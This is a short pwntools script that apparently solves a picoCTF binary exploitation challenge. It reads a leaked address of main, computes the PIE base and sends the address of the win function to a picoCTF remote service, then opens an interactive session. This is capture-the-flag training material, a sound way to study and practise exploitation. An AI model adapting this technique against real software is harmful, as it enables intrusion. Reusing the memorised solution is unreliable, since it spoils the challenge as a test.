from pwn import *

elf = ELF("./vuln")

#io = process(elf.path)

io = remote("rescued-float.picoctf.net", 55508)

io.recvuntil("Address of main: ")

main_address = int(io.recvline().strip(), 16)

elf.address = main_address - elf.sym.main

io.sendlineafter("Enter the address to jump to, ex => 0x12345: ", hex(elf.sym.win))

io.interactive()